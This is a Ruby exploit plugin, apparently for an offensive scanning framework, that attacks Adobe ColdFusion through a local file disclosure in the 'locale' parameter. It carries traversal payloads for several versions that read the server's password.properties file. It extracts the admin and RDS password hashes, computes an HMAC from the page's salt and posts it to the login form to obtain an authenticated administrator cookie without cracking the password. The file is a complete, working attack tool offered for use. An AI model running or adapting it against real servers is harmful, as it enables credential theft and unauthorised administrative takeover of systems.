# ColdFusion Locale LFI Exploit Plugin
#
# You should probably use the ColdFusion Version Checker Plugin First to determine version for best results
# This takes advantage of a LFI vulnerability in the 'locale' parameter found most commonly on the admin login page.
# You can read the admin credentials AND you can take advantage of a flaw in the login panel itself to further bypass need for cracking password hash. Plugin if successfull will present you with the admin hash, rds hash if present, and then attempt to perform authentication bypass technique which if successfull results in authorized cookie being presented which can be used to access the ColdFusion Admin Panel...
#
class ColdFusionLFI < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='ColdFusionLFI'
		module_info={
			'Name'        => 'Cold Fusion Locale LFI Exploit',
			'Version'     => 'v0.01b',
			'Description' => "This takes advantage of a LFI vulnerability in the 'locale' parameter found most commonly on the admin login page. Just give it the base web address to run check from and it will do its thing and present the findings...\n\tTarget => The target site and base to run checks for ColdFusion LFI\n\t\tEX: http://www.site.co.za/\n\t\tEX: https://192.168.1.69:8080/\n\tVersion => The ColdFusion Version Running on Target\n\t\t4 => JRun Version\n\t\t5 => Hail Mary (Try All)\n\t\t6 => Version 6\n\t\t7 => Version 7\n\t\t8 => Version 8\n\tPath => Optional Setting which can override the default path which is typically used\n\tKnown Possible Paths: /CFIDE/wizards/common/_logintowizard.cfm, /CFIDE/administrator/archives/index.cfm, /CFIDE/install.cfm, /CFIDE/administrator/entman/index.cfm, and /CFIDE/administrator/logging/settings.cfm",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'Target' => "http://www.site.com/", 'Version' => '7' } 
		module_optional={ 'Path' => '/CFIDE/administrator/enter.cfm',  }
		@non_set_private_options={ 'Auth' => 0, 'Cookie' => 'nil', 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } #Mostly for debugging, but for now the post is done using normal HTTP library so didnt code in Proxy support for that yet, sorry....

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			cflfi
		end
	end

	def cflfi
		case $module_required['Version']
			when '6'
				#CF Version 6
				cvtext = "ColdFusion Version 6"
				lfdpayload = 'locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en'
				puts "[".light_green + "*".white + "] Payload: ".light_green + "#{cvtext}".white
				credcheck(lfdpayload)
			when '7'
				#CF Version 7
				cvtext = "ColdFusion Version 7"
				lfdpayload = 'locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en'
				puts "[".light_green + "*".white + "] Payload: ".light_green + "#{cvtext}".white
				credcheck(lfdpayload)
			when '8'
				#CF Version 8
				cvtext = "ColdFusion Version 8"
				lfdpayload = 'locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en'
				puts "[".light_green + "*".white + "] Payload: ".light_green + "#{cvtext}".white
				credcheck(lfdpayload)
			when '4'
				#CF Version JRUN
				cvtext = "ColdFusion JRUN"
				lfdpayload = 'locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en'
				puts "[".light_green + "*".white + "] Payload: ".light_green + "#{cvtext}".white
				credcheck(lfdpayload)
			when '5'
				#HAIL MARY ATTEMPT, see if one works....
				puts "[".light_yellow + "*".white + "] Running Hail Mary Approach for Exploit".light_yellow + "!".cyan
				hailmary = [ 'locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en', 'locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en', 'locale=..\..\..\..\..\..\..\..\opt\coldfusionmx7\lib\password.properties%00en', 'locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en', 'locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en' ]
				hailmary.each do |lfdpayload|
					credcheck(lfdpayload)
				end
			else
				puts "[".light_red + "X".white + "] Unknown version provided".light_red + "!".white 
				puts "[".light_red + "X".white + "] Check the Plugin Options via '".light_red + "cmod".white + "' and try running again".light_red + ".....".white
		end
	end

	def credcheck(link2check)
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])

		target = "#{$module_required['Target'].sub(/\/$/, '')}#{$module_optional['Path']}?#{link2check}"
		puts "[".light_green + "*".white + "] Running Locale LFD Exploit against: ".light_green + "#{target}".white
		body = http._get("#{target}") #GET page with LFI payload link set
		doc = Hpricot(body[0]) #create a parsable object via Hpricot...
		creds = "#{doc.search('title')}".sub('<title>', '').sub('</title>', '') #parse doc object and pull title for creds...

		#if all seems well....
		if not creds.nil?
			if creds =~ /^password=(.+)/
				password=$1.chomp
			end
			if creds =~ /^rdspassword=(.+)/
				rdppassword=$1.chomp
			end
			#then get the salt from source code
			if body[0] =~ /\<input name="salt" type="hidden" value="(\d+)"\>/
				salt = $1.chomp
			end
			#If pass is present, continue and generate the HMAC hash based on password + salt....
			if not password.nil?
				hash = OpenSSL::HMAC.hexdigest('sha1', salt, password)
				puts "[".light_green + "*".white + "] ".light_green
				puts "[".light_green + "*".white + "] Found Credentials: ".light_green
				puts "[".light_green + "*".white + "] RDS Password".light_green + ": #{rdppassword}".white unless rdppassword.nil?
				puts "[".light_green + "*".white + "] Password".light_green + ": #{password}".white
				puts "[".light_green + "*".white + "] Salt".light_green + ": #{salt}".white
				puts "[".light_green + "*".white + "] HMAC Hash".light_green + ": #{hash}".white

				# Login using HMAC to bypass need to crack password hash, on success admin cookie will be set: CFAUTHORIZATION_cfadmin=<something>, if null didnt work :(
				if not hash.nil?
					#establish base for login request
					finalurl = URI("#{$module_required['Target'].sub(/\/$/, '')}#{$module_optional['Path']}")
					rez = Net::HTTP.post_form(finalurl, {"cfadminPassword" => "#{hash.upcase.chomp}", "requestedURL" => "/CFIDE/administrator/enter.cfm", "salt" => "#{salt}", "submit" => "login"})
					puts "[".light_green + "*".white + "] Authenticated Cookie: \n".light_green + "#{rez['set-cookie']}".white
				end
			else
				puts "[".light_yellow + "X".white + "] Not finding credentials".light_yellow + "!".white
			end
		else
			puts "[".light_red + "X".white + "] Not finding credentials".light_red + "!".white
		end
	end
end

ColdFusionLFI.new

